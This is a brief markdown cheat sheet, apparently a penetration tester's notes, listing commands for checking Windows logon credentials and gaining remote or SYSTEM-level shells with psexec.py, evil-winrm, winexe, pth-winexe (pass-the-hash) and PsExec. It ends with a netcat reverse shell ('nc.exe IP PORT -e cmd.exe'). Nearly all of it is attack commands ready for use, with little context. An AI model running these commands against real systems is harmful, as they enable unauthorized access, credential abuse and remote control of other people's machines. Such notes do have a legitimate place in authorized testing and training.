# privesc_tools

## check if win-logon-creds are working

### psexec.py

```bash
$ python3 /opt/impacket/examples/psexec.py USER:'PASS'@$IP
```

### evil-winrm

```bash
# only USER, no DOMAIN needed
$ evil-winrm -i IP -u <USER> [-H NT-HASH | -p PASS]
```

### winexe

```bash
$ winexe -U 'DOMAIN/USER%PASS' //IP cmd.exe
```

### pth-winexe

```bash
$ pth-winexe -U 'DOMAIN/USER%HASH' //IP cmd.exe
# [OR]
$ pth-winexe [--system] -U 'administrator%NTLM:HASH' //IP cmd.exe
# --system needs local admin hash
```

## PsExec.exe

```bash
PS> .\PsExec64.exe -accepteula -i -s <shell.exe>
# i: Run process interactively
# s: Run remote process in the System account.

> PSExec64.exe -i -u "nt authority\local service" <shell.exe>
# u: Run process as user-account <>

# Run executable with a different user:pass
PS> .\PsExec.exe -accepteula -u <user> -p <pass> nc.exe IP PORT -e cmd.exe
```
